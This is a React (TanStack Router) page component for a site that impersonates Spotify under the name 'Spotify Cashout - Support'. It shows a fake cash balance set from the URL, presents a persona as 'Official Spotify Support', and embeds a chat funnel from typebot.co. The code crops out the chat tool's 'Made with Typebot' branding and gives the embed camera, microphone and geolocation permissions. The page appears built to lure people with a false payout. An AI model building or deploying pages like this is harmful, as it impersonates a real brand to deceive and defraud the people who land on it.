import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Cashout - Support" },
      { name: "description", content: "Spotify Cashout Support" },
      { property: "og:title", content: "Spotify Cashout - Support" },
      { property: "og:description", content: "Spotify Cashout Support" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

function Index() {
  const [balance, setBalance] = useState("438.77");
  const [typebotSrc, setTypebotSrc] = useState(
    "https://typebot.co/type-spotify-pay-es-han5zk7"
  );

  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const b = params.get("balance");
      if (b) {
        const num = parseFloat(b);
        setBalance(isNaN(num) ? b : num.toFixed(2));
      }
      if (window.location.search) {
        setTypebotSrc(
          `https://typebot.co/type-spotify-pay-es-han5zk7${window.location.search}`
        );
      }
    }
  }, []);

  return (
    <div
      className="min-h-screen w-full flex items-center justify-center relative overflow-hidden font-sans select-none"
      style={{
        background:
          "radial-gradient(ellipse at 50% 30%, #0d3320 0%, #06170d 45%, #000000 85%)",
      }}
    >
      {/* Ambient green glow */}
      <div
        className="pointer-events-none fixed top-[-100px] left-1/2 -translate-x-1/2 w-[600px] h-[400px] z-0"
        style={{
          background:
            "radial-gradient(ellipse, rgba(29, 185, 84, 0.22) 0%, transparent 70%)",
        }}
      />

      {/* Main Container / Phone Wrapper */}
      <div className="relative z-10 w-full max-w-[460px] h-screen md:h-[95vh] md:max-h-[920px] bg-black flex flex-col shadow-[0_0_60px_rgba(0,0,0,0.95)] md:rounded-[24px] border md:border-[rgba(29,185,84,0.15)] overflow-hidden">
        {/* Header */}
        <header className="h-16 px-4 bg-black flex items-center justify-between border-b border-[#1a1a1a] flex-shrink-0 z-20">
          <div className="flex items-center gap-2 text-white font-bold text-[19px] tracking-tight">
            {/* Spotify SVG Logo */}
            <svg
              viewBox="0 0 24 24"
              className="w-[26px] h-[26px] fill-[#1DB954]"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
            </svg>
            <span>Spotify</span>
            <span className="text-white/35 font-light text-sm mx-0.5">|</span>
            <span className="text-white/70 font-medium text-xs tracking-wider uppercase">
              CASHOUT
            </span>
          </div>

          <div className="flex items-center">
            <div className="bg-[#1DB954] text-black font-extrabold text-[16px] md:text-[17px] px-4 py-1.5 rounded-full flex items-center shadow-[0_2px_10px_rgba(29,185,84,0.3)]">
              ${balance}
            </div>
          </div>
        </header>

        {/* Chat Wrapper */}
        <div className="flex-1 p-3 md:p-3.5 pb-4 md:pb-4 flex flex-col bg-transparent overflow-hidden min-h-0">
          <div className="flex-1 bg-white rounded-[18px] md:rounded-[20px] shadow-[0_10px_40px_rgba(0,0,0,0.6)] flex flex-col overflow-hidden relative min-h-0 border border-white/10">
            {/* Support Agent Info Header */}
            <div
              className="flex items-center gap-3 px-4 py-3 flex-shrink-0 border-b border-[#1DB954]/20 z-10"
              style={{
                background:
                  "linear-gradient(180deg, #f2fcf5 0%, #eaf8ef 100%)",
              }}
            >
              <div className="relative w-11 h-11 flex-shrink-0">
                <img
                  src="/isabel.jpg"
                  alt="IsabÃ©l R."
                  className="w-full h-full rounded-full object-cover object-top border-2 border-[#1DB954] shadow-[0_2px_8px_rgba(29,185,84,0.25)]"
                />
              </div>

              <div className="flex flex-col text-left">
                <span className="text-[#121212] font-bold text-[15px] leading-tight">
                  IsabÃ©l R.
                </span>
                <span className="text-[#1DB954] font-semibold text-[12px] flex items-center gap-1.5 mt-0.5">
                  <span className="w-2 h-2 rounded-full bg-[#1DB954] inline-block animate-pulse" />
                  Official Spotify Support
                </span>
              </div>
            </div>

            {/* Embedded Typebot Iframe with Bottom Clip to remove 'Made with Typebot' */}
            <div className="flex-1 relative w-full h-full overflow-hidden bg-white min-h-0">
              <iframe
                src={typebotSrc}
                className="w-full h-[calc(100%+45px)] -mb-[45px] border-none bg-white block"
                allow="geolocation; microphone; camera; autoplay"
                title="Spotify Support Funnel"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}